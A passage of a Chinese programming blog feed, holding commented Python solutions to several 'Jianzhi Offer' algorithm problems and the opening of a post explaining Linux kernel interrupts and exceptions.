class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">constructArr</span><span class="params">(self, a)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type a: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        从前向后累乘一次并保存结果，从后向前累乘一次并保存结果</span></span><br><span class="line"><span class="string">        就[1,2,3,4,5]而言</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(a)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res1 = [] </span><br><span class="line">        res2 = []</span><br><span class="line">        result = []</span><br><span class="line">        m = <span class="number">1</span></span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a[:<span class="number">-1</span>]: <span class="comment">#从前向后乘只计算到倒数第二个数</span></span><br><span class="line">            m*=i</span><br><span class="line">            res1.append(m) <span class="comment">#res1中保存[1,1*2,1*2*3,1*2*3*4]</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a[::<span class="number">-1</span>][:<span class="number">-1</span>]: <span class="comment">#从后向前乘只计算到第二个数</span></span><br><span class="line">            n*=i</span><br><span class="line">            res2.append(n) <span class="comment">#res2中保存[5,5*4,5*4*3,5*4*3*2]</span></span><br><span class="line">        res2 = res2[::<span class="number">-1</span>] <span class="comment">#反转后得[5*4*3*2,5*4*3,5*4,5]</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        此时res1 = [1,1*2,1*2*3,1*2*3*4]</span></span><br><span class="line"><span class="string">            res2 = [5*4*3*2,5*4*3,5*4,5]</span></span><br><span class="line"><span class="string">        我们可以得到当缺失第一个数时，值为res2[0]</span></span><br><span class="line"><span class="string">        当缺失最后一个数时，值为res1[-1]</span></span><br><span class="line"><span class="string">        从缺失第二个数到倒数第二个数</span></span><br><span class="line"><span class="string">        我们可以得到值为res[i]*res[i-1]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res2)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                result.append(res2[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">elif</span> i == len(res2):</span><br><span class="line">                result.append(res1[<span class="number">-1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result.append(res2[i]*res1[i<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-63-股票的最大利润-medium"><a href="#剑指-Offer-63-股票的最大利润-medium" class="headerlink" title="剑指 Offer 63. 股票的最大利润(medium)"></a>剑指 Offer 63. 股票的最大利润(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        max_num=<span class="number">0</span> <span class="comment">#记录当前股票最大差值</span></span><br><span class="line">        <span class="keyword">if</span> len(prices)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        min_num=prices[<span class="number">0</span>] <span class="comment">#将第一天的股票作为最小的值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(prices)):</span><br><span class="line">            min_num = min(min_num,prices[i<span class="number">-1</span>]) <span class="comment">#判断当天和当前最小值中的最小值</span></span><br><span class="line">            <span class="keyword">if</span> prices[i]-min_num&gt;max_num: <span class="comment">#如果当天的股票减去之前的股票最小值大于最大差值</span></span><br><span class="line">                max_num = prices[i]-min_num <span class="comment">#则替换最大差值</span></span><br><span class="line">        <span class="keyword">return</span> max_num</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-36-二叉搜索树与双向链表-medium"><a href="#剑指-Offer-36-二叉搜索树与双向链表-medium" class="headerlink" title="剑指 Offer 36. 二叉搜索树与双向链表(medium)"></a>剑指 Offer 36. 二叉搜索树与双向链表(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node(object):</span></span><br><span class="line"><span class="string">    def __init__(self, val, left=None, right=None):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.left = left</span></span><br><span class="line"><span class="string">        self.right = right</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    head = <span class="literal">None</span></span><br><span class="line">    tail = <span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">treeToDoublyList</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: Node</span></span><br><span class="line"><span class="string">        :rtype: Node</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        self.pre(root) <span class="comment">#中序遍历</span></span><br><span class="line">        self.head.left = self.tail <span class="comment">#头节点前驱指向尾节点</span></span><br><span class="line">        self.tail.right = self.head <span class="comment">#尾节点后驱指向头节点</span></span><br><span class="line">        <span class="keyword">return</span> self.head</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pre</span><span class="params">(self,root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.pre(root.left)</span><br><span class="line">        <span class="keyword">if</span>(self.head == <span class="literal">None</span>):</span><br><span class="line">            self.head = self.tail = root</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.tail.right = root</span><br><span class="line">            root.left = self.tail</span><br><span class="line">            self.tail = root</span><br><span class="line">        self.pre(root.right)</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-31-栈的压入、弹出序列-medium"><a href="#剑指-Offer-31-栈的压入、弹出序列-medium" class="headerlink" title="剑指 Offer 31. 栈的压入、弹出序列(medium)"></a>剑指 Offer 31. 栈的压入、弹出序列(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validateStackSequences</span><span class="params">(self, pushed, popped)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type pushed: List[int]</span></span><br><span class="line"><span class="string">        :type popped: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        s = [] <span class="comment">#初始化一个栈</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> popped:</span><br><span class="line">            <span class="comment">#得到每一个pop出去的数字在push数组中的下标</span></span><br><span class="line">            <span class="comment">#加一为了方便后续对s栈进行插入操作，即这里res-1才是真正的下标</span></span><br><span class="line">            res = pushed.index(i)+<span class="number">1</span></span><br><span class="line">            <span class="comment">#如果当前pop出去的数在push数组的下标大于s栈的长度</span></span><br><span class="line">            <span class="comment">#则需要将下标数字之前的数字都写入s栈中</span></span><br><span class="line">            <span class="keyword">if</span> res &gt; len(s):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(len(s),res):</span><br><span class="line">                    s.append(k)</span><br><span class="line">                <span class="comment">#这一步对pop出去的下标置为-1</span></span><br><span class="line">                s[res<span class="number">-1</span>] = <span class="number">-1</span></span><br><span class="line">            <span class="comment">#如果当前pop出去的数在push数组的下标小于s栈的长度</span></span><br><span class="line">            <span class="comment">#则我们只需要判断在s栈中对于res下标之后的数值是否为-1即可</span></span><br><span class="line">            <span class="keyword">elif</span> res &lt; len(s):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(res,len(s)):</span><br><span class="line">                    <span class="comment">#如果在res下标之后存在不为-1的下标，则直接返回false</span></span><br><span class="line">                    <span class="keyword">if</span> s[j] != <span class="number">-1</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">                <span class="comment">#如果res下标之后存在s栈中的都是-1</span></span><br><span class="line">                <span class="comment">#则对当前下标进行置为-1操作</span></span><br><span class="line">                s[res<span class="number">-1</span>] = <span class="number">-1</span></span><br><span class="line">        <span class="comment">#循环结束的话返回True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-35-复杂链表的复制-medium"><a href="#剑指-Offer-35-复杂链表的复制-medium" class="headerlink" title="剑指 Offer 35. 复杂链表的复制(medium)"></a>剑指 Offer 35. 复杂链表的复制(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node:</span></span><br><span class="line"><span class="string">    def __init__(self, x, next=None, random=None):</span></span><br><span class="line"><span class="string">        self.val = int(x)</span></span><br><span class="line"><span class="string">        self.next = next</span></span><br><span class="line"><span class="string">        self.random = random</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">copyRandomList</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: Node</span></span><br><span class="line"><span class="string">        :rtype: Node</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> head == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        node = head <span class="comment">#保留头节点不改变</span></span><br><span class="line">        <span class="keyword">while</span>(node): <span class="comment">#先用字典单独复制每一个节点信息</span></span><br><span class="line">            d[node] = Node(node.val)</span><br><span class="line">            node = node.next</span><br><span class="line">        node = head <span class="comment">#保留头节点不改变</span></span><br><span class="line">        <span class="keyword">while</span>(node): <span class="comment">#链接每一个单节点</span></span><br><span class="line">            d[node].next = d.get(node.next)</span><br><span class="line">            d[node].random = d.get(node.random)</span><br><span class="line">            node = node.next</span><br><span class="line">        <span class="keyword">return</span> d[head]</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-07-重建二叉树-medium"><a href="#剑指-Offer-07-重建二叉树-medium" class="headerlink" title="剑指 Offer 07. 重建二叉树(medium)"></a>剑指 Offer 07. 重建二叉树(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">buildTree</span><span class="params">(self, preorder, inorder)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type preorder: List[int]</span></span><br><span class="line"><span class="string">        :type inorder: List[int]</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> preorder:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root = TreeNode(preorder[<span class="number">0</span>]) <span class="comment">#将前序遍历第一个值作为根节点</span></span><br><span class="line">        index = inorder.index(preorder[<span class="number">0</span>]) <span class="comment">#找到根节点再中序遍历中的位置</span></span><br><span class="line">        root.left = self.buildTree(preorder[<span class="number">1</span>:<span class="number">1</span>+index],inorder[:index]) <span class="comment">#递归构建左子树</span></span><br><span class="line">        root.right = self.buildTree(preorder[<span class="number">1</span>+index:],inorder[index+<span class="number">1</span>:]) <span class="comment">#递归构建右子树</span></span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-45-把数组排成最小的数-medium"><a href="#剑指-Offer-45-把数组排成最小的数-medium" class="headerlink" title="剑指 Offer 45. 把数组排成最小的数(medium)"></a>剑指 Offer 45. 把数组排成最小的数(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minNumber</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        思路分析</span></span><br><span class="line"><span class="string">        依次比较nums中的数字，将尽可能组合起来小的数放在res数组的前面</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#先准备一个空的数组，用来存数组</span></span><br><span class="line">        res = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="comment">#如果res为空，那么直接添加当前数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">                res.append(i)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#如果res不为空，则从nums的当前数与res中的每一个数组合起来进行比较</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(res)):</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="string">"""</span></span><br><span class="line"><span class="string">                分别将当前数字和res中的每一个数字组合进行比较</span></span><br><span class="line"><span class="string">                例如nums当前数是30，res中的当前数是3</span></span><br><span class="line"><span class="string">                我们会得到两个组合，分别是303和330</span></span><br><span class="line"><span class="string">                将这两个数进行比较，发现303会小一些，所以我们将3放在30后面</span></span><br><span class="line"><span class="string">                在res数组中表现为继续向后比较</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">                s1 = str(res[j]) + str(i)</span><br><span class="line">                s2 = str(i) + str(res[j])</span><br><span class="line">                <span class="keyword">if</span> int(s1) &lt; int(s2):</span><br><span class="line">                    <span class="keyword">continue</span> <span class="comment">#继续向后比较</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment">#如果nums中的数放在res[j]之前会使得值更小一些</span></span><br><span class="line">                    <span class="comment">#那么我们就把nums中的当前数插入到res[j]之前这个位置</span></span><br><span class="line">                    res[j:j] = [i]</span><br><span class="line">                    <span class="comment">#flag=1说明已经nums中的值已经插入到res中了，不需要再比较了</span></span><br><span class="line">                    <span class="comment">#直接退出res循环</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#如果flag=0说明res已经遍历结束</span></span><br><span class="line">            <span class="comment">#这个时候只需要将nums当前值插入到res后面即可</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append(i)</span><br><span class="line"></span><br><span class="line">        s = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">            s += str(i)</span><br><span class="line">        <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-37-序列化二叉树-hard"><a href="#剑指-Offer-37-序列化二叉树-hard" class="headerlink" title="剑指 Offer 37. 序列化二叉树(hard)"></a>剑指 Offer 37. 序列化二叉树(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Codec</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.strTree=[]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""Encodes a tree to a single string.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            self.strTree.append(<span class="string">"null"</span>)</span><br><span class="line">            <span class="keyword">return</span> self.strTree</span><br><span class="line">        curStr = str(root.val)</span><br><span class="line">        self.strTree.append(curStr)</span><br><span class="line">        self.serialize(root.left)</span><br><span class="line">        self.serialize(root.right)</span><br><span class="line">        <span class="keyword">return</span> self.strTree</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="string">"""Decodes your encoded data to tree.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :type data: str</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(data) == <span class="number">1</span> <span class="keyword">and</span> data[<span class="number">0</span>] == <span class="string">"null"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        Tval = data.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> Tval == <span class="string">"null"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root = TreeNode(Tval)</span><br><span class="line">        root.left = self.deserialize(data)</span><br><span class="line">        root.right = self.deserialize(data)</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Codec object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># codec = Codec()</span></span><br><span class="line"><span class="comment"># codec.deserialize(codec.serialize(root))</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;剑指-Offer-43-1～n-整数中-1-出现的次数-hard&quot;&gt;&lt;a href=&quot;#剑指-Offer-43-1～n-整数中-1-出现的次数-hard&quot; class=&quot;headerlink&quot; title=&quot;剑指 Offer 43. 1～n 整数中 1 出现的次数
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>深入理解linux内核之中断和异常</title>
    <link href="elssm.github.io/2021/11/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3linux%E5%86%85%E6%A0%B8%E4%B9%8B%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8/"/>
    <id>elssm.github.io/2021/11/23/深入理解linux内核之中断和异常/</id>
    <published>2021-11-23T13:51:39.000Z</published>
    <updated>2021-12-13T09:53:03.099Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>中断通常被定义为一个事件，该事件改变处理器执行的指令顺序。这样的事件与CPU芯片内外部硬件电路产生的电信号相对应。</p><p>中断通常分为同步(synchronous)中断和异步(asynchronous)中断：</p><ul><li>同步中断是当指令执行时由CPU控制单元产生的，之所以称为同步，是因为只有在一条指令终止执行后CPU才会发出中断。</li><li>异步中断是由其他硬件设备依照CPU时钟信号随机产生的。</li></ul><p>在Intel微处理器手册中，把同步和异步中断分别称为异常(exception)和中断(interrupt)</p><p>中断是由<strong>间隔定时器</strong>和<strong>I/O设备</strong>产生的，例如，用户的一次按键会引起一个中断。</p><p>异常是由程序的错误产生的，或者是由内核必须处理的异常条件产生的。第一种情况下，内核通过发送一个信号来处理异常，例如<code>SIGTERM、SIGINT</code>等。第二种情况下，内核执行恢复异常需要的所有步骤，例如缺页，或对内核服务的一个请求。</p><h4 id="中断信号的作用"><a href="#中断信号的作用" class="headerlink" title="中断信号的作用"></a>中断信号的作用</h4><p>中断信号提供了一种特殊的方式，使得处理器转而去运行正常控制流之外的代码。当一个中断信号到达时，CPU必须停止它当前所做的事情，并且切换到一个新的活动，为了做到这一点，就要在内核态堆栈保存程序计数器的当前值(即eip和cs寄存器的内容)，并把与中断类型相关的一个地址放进程序计数器。</p><p>必须要声明的是，中断处理与进程切换有一个明显的差异：由中断或异常处理程序执行的代码不是一个进程。更确切地说，它是一个内核控制路径，代表中断发生时正在运行的进程执行，作为一个内核控制路径，中断处理程序比一个进程要“轻”（这是因为中断的上下文很少，建立或终止中断处理需要的事件很少）</p><p>中断处理是由内核执行的最敏感的任务之一，它必须满足以下约束</p><ul><li>内核的目标就是让中断尽可能快的处理完，尽其所能把更多的处理向后推迟，例如，假设一个数据块已经到达了网线，当硬件中断内核时，内核只简单的标志数据到来了，让处理器恢复到它以前运行的状态，其余的处理稍后再进行（如把数据移入一个缓冲区，它的接收进程可以在缓冲区找到数据并恢复这个进程的执行）。因此，内核响应中断后需要进行的操作分为两部分：对于关键紧急的部分，内核立即执行；其余部分内核随后执行。</li><li>因为中断随时会到来，所以内核可能正在处理其中一个中断时，另一个中断又发生了，应该尽可能多的允许这种情况发生，因为这能维持更多的I/O设备处于忙状态。因此，中断处理程序必须编写成使相应的内核控制路径能以嵌套的方式执行。当最后一个内核控制路径终止时，内核必须能恢复被中断进程的执行，或者，如果中断信号已导致了重新调度，内核能切换到另外的进程。</li><li>尽管内核在处理前一个中断时可以接受一个新的中断，但在内核代码中还是存在一些临界区，在临界区中，中断必须被禁止。必须尽可能地限制这样的临界区，因为根据以前的要求，内核尤其是中断处理程序，应该在大部分时间内以开中断的方式运行。</li></ul><h4 id="中断和异常"><a href="#中断和异常" class="headerlink" title="中断和异常"></a>中断和异常</h4><h5 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h5><ul><li>可屏蔽中断：I/O设备发出的所有中断请求都产生可屏蔽中断。可屏蔽中断可以处于两种状态：屏蔽的(masked)或非屏蔽的(unmasked)，一个屏蔽的中断只要还是屏蔽的，控制单元就忽略它。</li><li>非屏蔽中断：只有几个危机事件(如硬件故障)才引起非屏蔽中断，非屏蔽中断总是由CPU辨认</li></ul><h5 id="异常"><a href="#异常" class="headerlink" 